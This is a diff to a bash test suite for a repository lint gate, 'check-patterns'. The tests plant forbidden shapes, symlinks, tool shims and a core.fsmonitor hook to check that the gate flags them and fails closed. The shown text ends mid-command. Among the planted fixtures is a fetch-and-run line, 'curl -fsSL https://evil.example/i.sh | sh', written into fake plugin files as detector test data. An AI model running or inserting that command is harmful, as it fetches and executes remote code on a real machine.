@@ -221,8 +221,8 @@ EOF
 # === the pinned zsh-plugin shim-premise shape =============
 # The gate asserts the startup fork the shim neutralizes is STILL in the pinned
 # source, so a submodule bump re-verifies the shim. The fixture plants the plugin file
-# under $r/zsh/plugins/ (explicit-path arm; the --exclude-dir=plugins on the shared
-# arms does not reach a directly-named file).
+# under $r/zsh/plugins/ (explicit-path arm; the shared arms leave the pinned
+# zsh/plugins out of their roots, which does not reach a directly-named file).
 fsh_rel="zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
 plant_shims() {  # $1=root  $2=fsh-line
   mkdir -p "$1/lib" "$1/$(dirname "$fsh_rel")"
@@ -262,6 +262,27 @@ fails_with() {
     *) fail "$3: expected the message '$2', got: $out" ;;
   esac
 }
+
+# fails_only_with ROOT MESSAGE LABEL - fails_with, plus every `check-patterns:`
+# line but an informational SKIP must be MESSAGE: the non-zero exit cannot come
+# from another arm.
+fails_only_with() {
+  local rc=0 out line
+  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
+  [ "$rc" != "0" ] || fail "$3: the gate passed"
+  case "$out" in
+    *"$2"*) ;;
+    *) fail "$3: expected the message '$2', got: $out" ;;
+  esac
+  while IFS= read -r line; do
+    case "$line" in
+      "$2"* | "check-patterns: SKIP "*) ;;
+      check-patterns:*) fail "$3: another message fired too: $line" ;;
+    esac
+  done <<<"$out"
+  pass=$((pass + 1))
+}
+
 brew_msg="check-patterns: hardcoded Homebrew prefix"
 fork_msg="check-patterns: a 'brew shellenv' / 'brew --prefix' fork"
 b32_msg="check-patterns: bash 4 syntax in the bash-3.2 surface"
@@ -797,6 +818,20 @@ printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/tests/
 printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
 fails_with "$r" "$em_dash_msg" "a decoy tests/config/nvim/lazy-lock.json (not the real allowlisted path) must still fail"
 
+# --- $root is caller-supplied, so the exact-path exemption ERE-escapes it
+# (_re_escape): under a root holding an ERE metacharacter the real lock file
+# stays exempt (unescaped, `root+` reads as "roo" then one or more `t`, which
+# the literal `root+/` never matches), and a decoy that only an unescaped `.`
+# would match (lazy-lockXjson) is still flagged -----------------------------
+for re_root in 'root.x' 'root+'; do
+  r="$work/emdash-re-$re_root"; seed "$r"; mkdir -p "$r/config/nvim"
+  printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
+  [ "$(run "$r")" = "0" ] && ok \
+    || fail "a root named '$re_root': config/nvim/lazy-lock.json must still be exempt"
+  printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lockXjson"
+  fails_only_with "$r" "$em_dash_msg" "a root named '$re_root': a decoy config/nvim/lazy-lockXjson must still fail"
+done
+
 # --- REGRESSION-LOCK: `-I` (binary skip) is not pinned to a specific grep -----
 # version or flavor, so this locks in the CURRENT, relied-upon behavior: a file
 # that carries a NUL byte is treated as binary and skipped by `-I`, even when
@@ -868,7 +903,7 @@ printf '# note %s trailing\n' "$em_dash" > "$r/zsh/plugins/some-plugin/some-plug
 
 # --- every non-${scan[@]} prose-surface member is covered - a silent rename --
 # must fail loudly. HARDCODED, deliberately independent of bin/check-patterns's
-# own `for p in ...` list (the same reasoning as the -- arm's dd fixtures
+# own `_scan_roots ...` list (the same reasoning as the -- arm's dd fixtures
 # above): if a future edit renames or drops one of these 15 members from the
 # real `prose` array, this loop keeps asserting against the OLD list and the
 # corresponding case starts failing, rather than silently testing nothing.
@@ -907,26 +942,7 @@ sym_nogit_msg="check-patterns: symlink scan (git, repo-wide) cannot run: git is 
 sym_probe_msg="check-patterns: symlink scan (git, repo-wide) could not resolve the toplevel"
 sym_top_msg="check-patterns: symlink scan (git, repo-wide) resolved a different toplevel"
 sym_find_err_msg="check-patterns: symlink scan (find) errored"
-
-# fails_only_with ROOT MESSAGE LABEL - fails_with, plus every `check-patterns:`
-# line but an informational SKIP must be MESSAGE: the non-zero exit cannot come
-# from another arm.
-fails_only_with() {
-  local rc=0 out line
-  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
-  [ "$rc" != "0" ] || fail "$3: the gate passed"
-  case "$out" in
-    *"$2"*) ;;
-    *) fail "$3: expected the message '$2', got: $out" ;;
-  esac
-  while IFS= read -r line; do
-    case "$line" in
-      "$2"* | "check-patterns: SKIP "*) ;;
-      check-patterns:*) fail "$3: another message fired too: $line" ;;
-    esac
-  done <<<"$out"
-  pass=$((pass + 1))
-}
+plugins_msg="check-patterns: an entry under zsh/plugins/ that is not a pinned plugin"
 
 # _git_repo DIR - a minimal scratch git repo, gpgsign off, author fixed so the
 # fixture never depends on this machine's git config existing.
@@ -1039,12 +1055,12 @@ git -C "$r" update-index --add --cacheinfo \
 git -C "$r" commit -qm "add pinned submodule"
 [ "$(run "$r")" = "0" ] && ok || fail "a submodule gitlink matching .gitmodules must not be flagged"
 
-# --- an UNTRACKED symlink under the excluded zsh/plugins/ path is not
-# flagged by either pass: find prunes the exact path, and it is not tracked -
-r="$work/sym-plugins-exempt"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
+# --- an UNTRACKED symlink directly under zsh/plugins/ is flagged in a git
+# checkout too: no arm reads there, and the direct-child find always runs ---
+r="$work/sym-plugins-untracked"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
 git -C "$r" add -A && git -C "$r" commit -qm init
 ln -s ./nonexistent-target "$r/zsh/plugins/evil-link"
-[ "$(run "$r")" = "0" ] && ok || fail "an untracked symlink under zsh/plugins/ must not be flagged"
+fails_only_with "$r" "$plugins_msg" "an untracked symlink directly under zsh/plugins/ must be flagged (git checkout)"
 
 # --- REGRESSION: $root a subdirectory of a LARGER repo must not make the
 # git pass scan the PARENT's whole tree - a tracked symlink outside $root
@@ -1080,18 +1096,33 @@ GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
 
 # --- FAIL CLOSED: an unreadable dir in the surface fails the find pass.
 # `chmod 000` is bypassed by root (DAC_OVERRIDE) - see the general fail-closed
-# case above for what was tried instead. The dir sits under lib/plugins/,
-# which every grep arm skips (--exclude-dir=plugins) but find does not, so
-# arm 12 is the ONLY arm that errors: fails_only_with then proves the non-zero
-# exit is arm 12's own bad=1, not another arm's. ------------------------------
+# case above for what was tried instead. Every grep arm walks the same dir and
+# errors too, so this proves find's own report, not that its bad=1 stands
+# alone: the find-shim case below isolates that. ------------------------------
 if [ "$(id -u)" -ne 0 ]; then
-  r="$work/sym-find-failclosed"; seed "$r"; mkdir -p "$r/lib/plugins/locked"
-  chmod 000 "$r/lib/plugins/locked"
-  fails_only_with "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
-  chmod u+rwx "$r/lib/plugins/locked"
+  r="$work/sym-find-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
+  chmod 000 "$r/lib/locked"
+  fails_with "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
+  chmod u+rwx "$r/lib/locked"
 else
   echo "  SKIP: running as root - cannot exercise arm 12's find-branch fail-closed case"
 fi
+
+# --- FAIL CLOSED, isolated: a `find` that exits non-zero on PATH. find is
+# arm 12's alone (no grep arm runs it), so fails_only_with proves the non-zero
+# exit is arm 12's own bad=1. No zsh/plugins in the fixture, so the no-.git
+# zsh/plugins pass (also find) does not run. Runs as root too. -------------
+find_shim="$work/find-shim"; mkdir -p "$find_shim"
+printf '#!/bin/sh
+echo "find: simulated read error" >&2
+exit 1
+' > "$find_shim/find"
+chmod u+x "$find_shim/find"
+# A FRESH shell: the shim must be the find a new process resolves.
+[ "$(PATH="$find_shim:$PATH" bash -c 'command -v find')" = "$find_shim/find" ] \
+  || fail "the find shim is not the find a fresh process resolves"
+r="$work/sym-find-shim"; seed "$r"
+PATH="$find_shim:$PATH" fails_only_with "$r" "$sym_find_err_msg" "a find that exits non-zero must fail closed the symlink scan"
 
 # --- FAIL CLOSED: a corrupted git index fails the repo-wide git pass, not a
 # silent pass ("no symlinks") -------------------------------------------------
@@ -1120,8 +1151,10 @@ fails_only_with "$r" "$sym_top_msg" "a .git whose core.worktree points away from
 
 # --- a .git at $root with git absent from PATH fails CLOSED -----------------
 # PATH is an explicit allowlist: every external tool bin/check-patterns runs
-# (bash for its shebang via env), resolved from the real PATH, and never git.
-# A new tool there makes it print "command not found", failed below.
+# on any path (bash for its shebang via env), resolved from the real PATH, and
+# never git. It is a superset of what the no-git path needs, so a tool only
+# the git pass would run (mktemp, rm) sits here too. A tool check-patterns
+# needs that is missing here makes it print "command not found", failed below.
 nogit_bin="$work/nogit-bin"; mkdir -p "$nogit_bin"
 for t in bash env grep sed find mktemp cat sort rm; do
   # type -P: a PATH file only, never a builtin, function or alias of that name.
@@ -1134,23 +1167,18 @@ done
 if nogit_git="$(PATH="$nogit_bin" "$nogit_bin/bash" -c 'command -v git')"; then
   {
     echo "  git-less PATH: $nogit_bin -> git resolves as '$nogit_git'"
-    PATH="$nogit_bin" "$nogit_bin/bash" -c 'type -a git' 2>&1
-    ls -la "$nogit_bin"
+    PATH="$nogit_bin" "$nogit_bin/bash" -c 'type -a git' 2>&1 || true
+    ls -la "$nogit_bin" || true
   } >&2
   fail "the git-less PATH fixture still resolves git"
 fi
 r="$work/sym-nogit"; _git_repo "$r"; seed "$r"
 git -C "$r" add -A && git -C "$r" commit -qm init
-nogit_rc=0
-nogit_out="$(PATH="$nogit_bin" STRICT= "$cp" "$r" 2>&1)" || nogit_rc=$?
-[ "$nogit_rc" != "0" ] || fail "a .git at root with git absent from PATH must fail closed (rc 0)"
+nogit_out="$(PATH="$nogit_bin" STRICT= "$cp" "$r" 2>&1)" || true
 case "$nogit_out" in
   *"command not found"*) fail "the git-less PATH fixture lacks a tool bin/check-patterns runs: $nogit_out" ;;
 esac
-case "$nogit_out" in
-  *"$sym_nogit_msg"*) ok ;;
-  *) fail "a .git at root with git absent from PATH: expected '$sym_nogit_msg', got: $nogit_out" ;;
-esac
+PATH="$nogit_bin" fails_only_with "$r" "$sym_nogit_msg" "a .git at root with git absent from PATH must fail closed"
 
 # --- GIT_TRACE / GIT_TRACE2 on stderr (not local env vars, so not stripped)
 # must not corrupt the first NUL record: a first-sorting tracked symlink
@@ -1254,21 +1282,93 @@ r="$work/sym-plugins-is-link"; seed "$r"; mkdir -p "$r/zsh" "$r/elsewhere"
 ln -s ../elsewhere "$r/zsh/plugins"
 fails_only_with "$r" "$sym_msg" "zsh/plugins itself a symlink must be reported, not pruned"
 
-# --- the prune is the ONE exact zsh/plugins path: a `plugins` dir anywhere
-# else is still walked (no .git: find alone) ---------------------------------
+# --- zsh ITSELF a symlink is reported too: _scan_roots expands only a real
+# zsh directory, never through a link (no .git: find) ----------------------
+r="$work/sym-zsh-is-link"; seed "$r"; mkdir -p "$r/elsewhere/plugins"
+ln -s ./elsewhere "$r/zsh"
+fails_only_with "$r" "$sym_msg" "zsh itself a symlink must be reported, not expanded through"
+
+# --- zsh/ that is not both readable and searchable stays ONE root, so grep
+# and find error on it: expanding it would glob to nothing and pass ---------
+if [ "$(id -u)" -ne 0 ]; then
+  for zmode in 000 100 400; do
+    r="$work/zsh-mode-$zmode"; seed "$r"; mkdir -p "$r/zsh"
+    printf 'uname -m\n' > "$r/zsh/arch.zsh"
+    chmod "$zmode" "$r/zsh"
+    fails_with "$r" "check-patterns: curl|sh scan errored" "a zsh/ at mode $zmode must fail closed"
+    chmod u+rwx "$r/zsh"
+  done
+else
+  echo "  SKIP: running as root - cannot exercise the unreadable zsh/ fail-closed cases"
+fi
+
+# --- zsh/'s dot entries are scanned: `*` skips them, `.[!.]*` and `..?*`
+# add them back; a dot-entry symlink is reported --------------------------
+for dotf in .x.zsh ..x.zsh; do
+  r="$work/zsh-dot-$dotf"; seed "$r"; mkdir -p "$r/zsh"
+  printf 'uname -m\n' > "$r/zsh/$dotf"
+  fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "zsh/$dotf must be scanned"
+done
+r="$work/zsh-dot-link"; seed "$r"; mkdir -p "$r/zsh"
+ln -s ./nonexistent-target "$r/zsh/.evil-link"
+fails_only_with "$r" "$sym_msg" "a dot-entry symlink in zsh/ must be reported"
+
+# --- a symlink entry of zsh/ goes to arm 12 alone, never to a grep arm as an
+# operand (GNU grep -r follows an operand symlink, BSD grep does not): into
+# the pinned plugins, out of the surface, or dangling, only arm 12 reports --
+r="$work/zsh-link-into-plugins"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
+printf 'uname -m\n' > "$r/zsh/plugins/p/p.zsh"
+ln -s ./plugins "$r/zsh/pl"
+fails_only_with "$r" "$sym_msg" "zsh/pl -> plugins must not pull pinned code into the grep arms"
+r="$work/zsh-link-outside"; seed "$r"; mkdir -p "$r/zsh" "$r/outside"
+printf 'uname -m\n' > "$r/outside/o.zsh"
+ln -s ../outside "$r/zsh/out"
+fails_only_with "$r" "$sym_msg" "zsh/out -> ../outside must not be scanned by the grep arms"
+r="$work/zsh-link-dangling"; seed "$r"; mkdir -p "$r/zsh"
+ln -s ./nonexistent-target "$r/zsh/dang"
+fails_only_with "$r" "$sym_msg" "a dangling zsh/ entry must be reported by arm 12 alone, not error the grep arms"
+
+# --- a regular FILE named zsh/plugins is not the pinned directory: scanned --
+r="$work/zsh-plugins-file"; seed "$r"; mkdir -p "$r/zsh"
+printf 'uname -m\n' > "$r/zsh/plugins"
+fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a plain file named zsh/plugins must be scanned"
+
+# --- an inherited BASHOPTS must not change the globbing: failglob aborted
+# on an unmatched dot glob (rc 1, read as a violation), dotglob reported each
+# zsh/ dot-entry hit twice. bash imports BASHOPTS from 4.1 on only, so a
+# bash without it skips here, visibly ----------------------------------------
+cp_bash="$(env bash -c 'printf %s "$BASH"')"
+if [ "$(env BASHOPTS=failglob "$cp_bash" -c 'shopt -q failglob && echo y' 2>/dev/null || true)" = y ]; then
+  r="$work/bashopts-failglob"; seed "$r"; mkdir -p "$r/zsh"
+  printf 'noop() { : ; }\n' > "$r/zsh/a.zsh"
+  bo_rc=0; env BASHOPTS=failglob STRICT= "$cp" "$r" >/dev/null 2>&1 || bo_rc=$?
+  [ "$bo_rc" = "0" ] && ok || fail "an inherited BASHOPTS=failglob must not fail a clean tree (rc $bo_rc)"
+  r="$work/bashopts-dotglob"; seed "$r"; mkdir -p "$r/zsh"
+  printf 'uname -m\n' > "$r/zsh/.x.zsh"
+  bo_out="$(env BASHOPTS=dotglob STRICT= "$cp" "$r" 2>&1)" || true
+  bo_n="$(printf '%s\n' "$bo_out" | grep -c '/zsh/\.x\.zsh:' || true)"
+  [ "$bo_n" = "1" ] && ok || fail "an inherited BASHOPTS=dotglob must not duplicate a hit ($bo_n): $bo_out"
+else
+  echo "  SKIP: $cp_bash does not import BASHOPTS - the inherited-shopt cases need bash 4.1+"
+fi
+
+# --- the exclusion is the ONE exact zsh/plugins path: a `plugins` dir
+# anywhere else is still walked (no .git: find alone) ------------------------
 for pdir in lib/plugins docs/plugins zsh/sub/plugins; do
   r="$work/sym-other-plugins-$(printf '%s' "$pdir" | tr '/' '-')"; seed "$r"
   mkdir -p "$r/$pdir"; ln -s ./nonexistent-target "$r/$pdir/evil-link"
   fails_only_with "$r" "$sym_msg" "a symlink under $pdir (not the pinned zsh/plugins) must be caught"
 done
 
-# --- a glob character in $root must not break the literal zsh/plugins prune
-# (find -path takes a pattern; `*` and `?` still match themselves, a bracket
-# expression does not) ------------------------------------------------------
-r="$work/glob[x]"; seed "$r"; mkdir -p "$r/zsh/plugins"
-ln -s ./nonexistent-target "$r/zsh/plugins/evil-link"
+# --- a glob character in $root must not break the literal zsh/plugins
+# exclusion (_scan_roots globs "$root"/zsh/*, with $root quoted): a symlink
+# inside a pinned plugin dir stays unwalked, and zsh/ itself is still read --
+r="$work/glob[x]"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
+ln -s ./nonexistent-target "$r/zsh/plugins/p/evil-link"
 [ "$(run "$r")" = "0" ] && ok \
-  || fail "a root named 'glob[x]': the pinned zsh/plugins path must still be pruned"
+  || fail "a root named 'glob[x]': the pinned zsh/plugins path must still be left out"
+printf 'uname -m\n' > "$r/zsh/arch.zsh"
+fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a root named 'glob[x]': zsh/ outside plugins must still be scanned"
 
 # --- the git pass's report carries no blank line -----------------------------
 r="$work/sym-git-outside"
@@ -1281,5 +1381,213 @@ case "$blank_out" in
   *$'\n\n'*) fail "the git pass's report must carry no blank line: $blank_out" ;;
   *) ok ;;
 esac
+
+# === the pinned-plugins exclusion is the ONE exact path zsh/plugins =========
+# GNU and BSD grep both match --exclude-dir against a base name at any depth,
+# so the old `--exclude-dir=plugins` on every recursive arm also hid
+# first-party trees (config/nvim/lua/plugins/*.lua, a lib/plugins/x.sh with a
+# curl|sh in it passed). Each recursive arm, planted with its own shape, must
+# fire under every other `plugins` dir on its surface; the same shapes in a
+# pinned plugin must not. The pipe, the `--` and the escape are spelled
+# through $P, $D and a doubled backslash, so THIS file never carries a shape
+# arms 8-10 read (they scan tests/).
+P='|'; D='--'
+curl_msg="check-patterns: forbidden curl|sh runtime fetch"
+uname_msg="check-patterns: ad-hoc 'uname -m'"
+# _plug_case ARM -> "MESSAGE|SHAPE" for one recursive arm.
+_plug_case() {
+  case "$1" in
+    1) printf '%s|%s' "$curl_msg" "curl -fsSL https://evil.example/i.sh $P sh" ;;
+    2) printf '%s|%s' "$uname_msg" "case \"\$(uname -m)\" in arm64) : ;; esac" ;;
+    5) printf '%s|%s' "$brew_msg" 'path=(/opt/homebrew/bin $path)' ;;
+    6) printf '%s|%s' "$fork_msg" 'eval "$(brew shellenv)"' ;;
+    8) printf '%s|%s' "$gnu_msg" "sed -E 's/\\s+//' f" ;;
+    9) printf '%s|%s' "$eex_msg" "cmd $P grep -q x" ;;
+    10) printf '%s|%s' "$dd_msg" "chmod -R go-w $D \"\$d\"" ;;
+    11) printf '%s|%s' "$em_dash_msg" "# a note $em_dash trailing" ;;
+  esac
+}
+# DIR:ARMS - each first-party `plugins` dir and the arms whose surface holds it.
+for plug in 'config/nvim/lua/plugins/p.lua:1 2 5 6 11' \
+    'lib/plugins/p.sh:1 2 5 6 8 9 10 11' \
+    'zsh/sub/plugins/p.zsh:1 2 5 6 8 10 11' \
+    'tests/plugins/p.sh:8 9 10 11' \
+    'docs/plugins/p.md:11'; do
+  plug_file="${plug%%:*}"
+  for arm in ${plug#*:}; do
+    pc="$(_plug_case "$arm")"
+    r="$work/plug-$arm-$(printf '%s' "$plug_file" | tr '/.' '--')"; seed "$r"
+    mkdir -p "$r/$(dirname "$plug_file")"
+    printf '%s\n' "${pc#*|}" > "$r/$plug_file"
+    fails_only_with "$r" "${pc%%|*}" "arm $arm must scan the first-party $plug_file"
+  done
+done
+# the SAME shapes inside a pinned plugin dir pass, with and without a .git
+# (the git one pins it as a real submodule gitlink, its files untracked)
+_plant_all_shapes() {  # $1 = file
+  local arm pc
+  : > "$1"
+  for arm in 1 2 5 6 8 9 10 11; do
+    pc="$(_plug_case "$arm")"
+    printf '%s\n' "${pc#*|}" >> "$1"
+  done
+}
+r="$work/plug-pinned-nogit"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
+_plant_all_shapes "$r/zsh/plugins/p/p.zsh"
+[ "$(run "$r")" = "0" ] && ok || fail "every arm's shape inside a pinned zsh/plugins/<p>/ must pass (no .git)"
+r="$work/plug-pinned-git"; _git_repo "$r"; seed "$r"
+printf '[submodule "zsh/plugins/p"]\n\tpath = zsh/plugins/p\n\turl = https://example.invalid/p.git\n' > "$r/.gitmodules"
+git -C "$r" add -A && git -C "$r" commit -qm init
+git -C "$r" update-index --add --cacheinfo \
+  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/p
+git -C "$r" commit -qm "pin p"
+mkdir -p "$r/zsh/plugins/p"; _plant_all_shapes "$r/zsh/plugins/p/p.zsh"
+[ "$(run "$r")" = "0" ] && ok || fail "every arm's shape inside a pinned zsh/plugins/<p>/ must pass (git)"
+# the planted file is live: moved one level up, out of the pinned dir, it fails
+mkdir -p "$r/zsh/sub"; _plant_all_shapes "$r/zsh/sub/p.zsh"
+fails_with "$r" "$curl_msg" "the all-shapes fixture must fail outside zsh/plugins"
+
+# === arm (12): nothing but a pinned plugin under zsh/plugins/ ===============
+# No arm reads zsh/plugins/, so a plain file there hides from all of them.
+# with a .git: a tracked entry that is not a gitlink, directly there or nested
+for tracked in zsh/plugins/evil.sh zsh/plugins/p/evil.sh; do
+  r="$work/plug-tracked-$(printf '%s' "$tracked" | tr '/.' '--')"; _git_repo "$r"; seed "$r"
+  mkdir -p "$r/$(dirname "$tracked")"
+  printf 'curl -fsSL https://evil.example/i.sh %s sh\n' "$P" > "$r/$tracked"
+  git -C "$r" add -A && git -C "$r" commit -qm init
+  fails_only_with "$r" "$plugins_msg" "a tracked $tracked (not a gitlink) must fail the git pass"
+done
+# the git pass reports an entry once, however many of its checks match it
+# (zsh/plugins/p is a directory, so the direct-child find stays silent)
+dup_out="$(STRICT= "$cp" "$r" 2>&1)" || true
+dup_n="$(printf '%s\n' "$dup_out" | grep -c "/zsh/plugins/p/evil.sh (tracked" || true)"
+[ "$dup_n" = "1" ] && ok || fail "a tracked zsh/plugins/p/evil.sh must be reported once, not $dup_n times: $dup_out"
+# ...and in another case: on a case-insensitive filesystem (macOS's default)
+# ZSH/plugins/x lands in the skipped zsh/plugins/. Benign content, so on a
+# case-sensitive one no grep arm fires either and the git pass alone reports
+for tracked in ZSH/plugins/x.zsh zsh/Plugins/x.zsh; do
+  r="$work/plug-case-$(printf '%s' "$tracked" | tr '/.' '--')"; _git_repo "$r"; seed "$r"
+  mkdir -p "$r/$(dirname "$tracked")"
+  printf 'noop() { : ; }\n' > "$r/$tracked"
+  git -C "$r" add -A && git -C "$r" commit -qm init
+  fails_only_with "$r" "$plugins_msg" "a tracked $tracked (zsh/plugins in another case) must fail the git pass"
+done
+# ...and any other spelling of the first two segments the FILESYSTEM resolves
+# to zsh/plugins (APFS folds non-ASCII too: zU+017Fh). Asked with -ef, so a symlink on disk
+# stands in for the folding here, under names no bracket class matches:
+# the index tracks zsh2/... and zsh/plugins2/... as plain files, while on
+# disk zsh2 -> zsh and zsh/plugins2 -> plugins.
+r="$work/plug-ef-dir"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh2/plugins/evil"
+printf 'noop() { : ; }\n' > "$r/zsh2/plugins/evil/e.zsh"
+git -C "$r" add -A && git -C "$r" commit -qm init
+rm -rf "$r/zsh2"; mkdir -p "$r/zsh/plugins"; ln -s zsh "$r/zsh2"
+fails_only_with "$r" "$plugins_msg" "a tracked zsh2/plugins/evil/e.zsh whose zsh2 is zsh on disk must fail"
+ef_out="$(STRICT= "$cp" "$r" 2>&1)" || true
+case "$ef_out" in
+  *"on disk, 'zsh2/plugins' is the same directory as zsh/plugins)"*) ok ;;
+  *) fail "the zsh2 fixture must be reported by the -ef test: $ef_out" ;;
+esac
+# NEGATIVE: a tracked zsh2/extra.zsh (zsh2 -> zsh on disk) lands at
+# zsh/extra.zsh, which the grep arms scan: its shape is theirs to report,
+# and it is no zsh/plugins entry
+r="$work/plug-ef-outside-plugins"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh2"
+printf 'uname -m\n' > "$r/zsh2/extra.zsh"
+git -C "$r" add -A && git -C "$r" commit -qm init
+rm -rf "$r/zsh2"; mkdir -p "$r/zsh/plugins"
+printf 'uname -m\n' > "$r/zsh/extra.zsh"; ln -s zsh "$r/zsh2"
+fails_only_with "$r" "check-patterns: ad-hoc 'uname -m'" "a tracked zsh2/extra.zsh landing in zsh/ must be the grep arm's, not a zsh/plugins entry"
+r="$work/plug-ef-sub"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins2/evil"
+printf 'noop() { : ; }\n' > "$r/zsh/plugins2/evil/e.zsh"
+git -C "$r" add -A && git -C "$r" commit -qm init
+rm -rf "$r/zsh/plugins2"; mkdir -p "$r/zsh/plugins"; ln -s plugins "$r/zsh/plugins2"
+fails_with "$r" "$plugins_msg" "a tracked zsh/plugins2/evil/e.zsh whose zsh/plugins2 is zsh/plugins on disk must fail"
+ef_out="$(STRICT= "$cp" "$r" 2>&1)" || true
+case "$ef_out" in
+  *"on disk, 'zsh/plugins2' is the same directory as zsh/plugins)"*) ok ;;
+  *) fail "a tracked zsh/plugins2/evil/e.zsh whose zsh/plugins2 is zsh/plugins on disk must fail: $ef_out" ;;
+esac
+# a tracked symlink there: the git pass reports it as a symlink, and the
+# always-on direct-child find as an entry that is not a pinned plugin
+r="$work/plug-tracked-link"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
+ln -s ../../lib/os.sh "$r/zsh/plugins/evil-link"
+git -C "$r" add -A && git -C "$r" commit -qm init
+fails_with "$r" "$sym_git_msg" "a tracked symlink under zsh/plugins/ must report as a symlink"
+fails_with "$r" "$plugins_msg" "a tracked symlink directly under zsh/plugins/ must fail the direct-child find"
+# the direct-child find (it runs with or without a .git; these fixtures have
+# none, so it is the only pass): a child that is not a directory
+r="$work/plug-nogit-file"; seed "$r"; mkdir -p "$r/zsh/plugins"
+printf 'x\n' > "$r/zsh/plugins/evil.sh"
+fails_only_with "$r" "$plugins_msg" "a plain file directly under zsh/plugins/ (no .git) must fail"
+r="$work/plug-nogit-link"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
+ln -s ./p "$r/zsh/plugins/evil-link"
+fails_only_with "$r" "$plugins_msg" "a symlink directly under zsh/plugins/ (no .git) must fail"
+# ...and that find fails closed on its own
+if [ "$(id -u)" -ne 0 ]; then
+  r="$work/plug-nogit-locked"; seed "$r"; mkdir -p "$r/zsh/plugins"
+  chmod 000 "$r/zsh/plugins"
+  fails_only_with "$r" "check-patterns: zsh/plugins scan (find) errored" "an unreadable zsh/plugins (no .git) must fail closed"
+  chmod u+rwx "$r/zsh/plugins"
+else
+  echo "  SKIP: running as root - cannot exercise the zsh/plugins find fail-closed case"
+fi
+
+# === arm (12): git's local env var list is itself checked ====================
+# _git_clean strips what `git rev-parse --local-env-vars` names; a failed,
+# empty or partial answer would strip nothing and let a leaked GIT_DIR steer
+# the pass. A git shim on PATH answers that one call, and a FRESH process
+# confirms the shim is what check-patterns will see.
+lev_msg="check-patterns: symlink scan (git, repo-wide) could not list git's local env vars"
+r="$work/lev-target"; _git_repo "$r"; seed "$r"
+git -C "$r" add -A && git -C "$r" commit -qm init
+for how in fail empty nodir noindex; do
+  shim="$work/lev-shim-$how"; mkdir -p "$shim"
+  case "$how" in
+    fail) lev_body="printf 'GIT_DIR\\nGIT_INDEX_FILE\\n'; exit 1" ;;
+    empty) lev_body='exit 0' ;;
+    nodir) lev_body="printf 'GIT_WORK_TREE\\nGIT_INDEX_FILE\\n'; exit 0" ;;
+    noindex) lev_body="printf 'GIT_DIR\\nGIT_WORK_TREE\\n'; exit 0" ;;
+  esac
+  {
+    printf '#!/bin/sh\n'
+    printf 'if [ "$*" = "rev-parse --local-env-vars" ]; then %s; fi\n' "$lev_body"
+    printf 'exec "%s" "$@"\n' "$real_git"
+  } > "$shim/git"
+  chmod u+x "$shim/git"
+  lev_probe_rc=0
+  lev_probe="$(PATH="$shim:$PATH" bash -c 'git rev-parse --local-env-vars')" || lev_probe_rc=$?
+  case "$how" in
+    fail) [ "$lev_probe_rc" -ne 0 ] && [ "$lev_probe" = "GIT_DIR"$'\n'"GIT_INDEX_FILE" ] ;;
+    empty) [ "$lev_probe_rc" -eq 0 ] && [ -z "$lev_probe" ] ;;
+    nodir) [ "$lev_probe" = "GIT_WORK_TREE"$'\n'"GIT_INDEX_FILE" ] ;;
+    noindex) [ "$lev_probe" = "GIT_DIR"$'\n'"GIT_WORK_TREE" ] ;;
+  esac || fail "the '$how' git shim is not what a fresh process sees (rc $lev_probe_rc): $lev_probe"
+  PATH="$shim:$PATH" fails_only_with "$r" "$lev_msg" "a '$how' --local-env-vars answer must fail closed"
+done
+
+# === arm (12): git inside $root never runs core.fsmonitor ====================
+# That key names a program, and a read-only ls-files runs it. The fixture
+# first proves its hook is live under a plain git call.
+r="$work/fsmonitor"; _git_repo "$r"; seed "$r"
+git -C "$r" add -A && git -C "$r" commit -qm init
+fsm_hit="$work/fsmonitor-hit"
+printf '#!/bin/sh\n: > "%s"\nexit 1\n' "$fsm_hit" > "$work/fsmonitor-hook"
+chmod u+x "$work/fsmonitor-hook"
+git -C "$r" config core.fsmonitor "$work/fsmonitor-hook"
+git -C "$r" ls-files >/dev/null 2>&1 || true
+[ -e "$fsm_hit" ] || fail "the core.fsmonitor fixture hook does not run under a plain git ls-files"
+rm -f "$fsm_hit"
+[ "$(run "$r")" = "0" ] && ok || fail "a clean repo with a core.fsmonitor hook must still pass"
+[ ! -e "$fsm_hit" ] && ok || fail "check-patterns must not run the repo's core.fsmonitor program"
+
+# === arm (12): a dubious-ownership repo fails the toplevel probe closed =====
+# GIT_TEST_ASSUME_DIFFERENT_OWNER makes git treat the repo as another user's.
+# It is a git-INTERNAL test knob, not a documented interface: if a git release
+# drops it, the probe succeeds, the gate passes, and fails_only_with fails
+# this case loudly ("the gate passed") - never a silent pass.
+# No global or system config, so an ambient safe.directory cannot waive it.
+r="$work/dubious"; _git_repo "$r"; seed "$r"
+git -C "$r" add -A && git -C "$r" commit -qm init
+GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TEST_ASSUME_DIFFERENT_OWNER=1 \
